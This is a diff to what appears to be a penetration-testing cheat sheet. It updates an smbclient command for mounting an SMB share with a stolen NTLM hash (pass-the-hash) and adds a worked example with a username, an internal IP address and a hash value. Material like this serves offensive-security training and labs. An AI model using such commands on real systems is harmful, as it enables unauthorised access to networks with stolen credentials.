@@ -46,7 +46,11 @@ smbclient "\\\\(TARGET IP)\\IPC\$\\" -N -U (USER)
 ```
 To mount a share with a username and stolen NTLM hash,
 ```
-root@attacker-machine:~# smbclient \\\\(TARGET IP ADDRESS)\\(SHARE NAME)\\ -U (DOMAIN NAME)\(USERNAME)%(FULL NTLM HASH)
+root@attacker-machine:~# smbclient --user=(TARGET USERNAME) --pw-nt-hash -m smb3 \\\\(TARGET IP ADDRESS)\\(TARGET SHARE)\\ (NTLM HASH)
+```
+e.g.
+```
+root@attacker-machine:~# smbclient --user=arm554 --pw-nt-hash -m smb3 -L 172.16.0.10 \\\\172.16.0.10\\ 6361DEA164EE8FE91FE7B117FBC9CA5E
 ```
 
 ### File Transfers
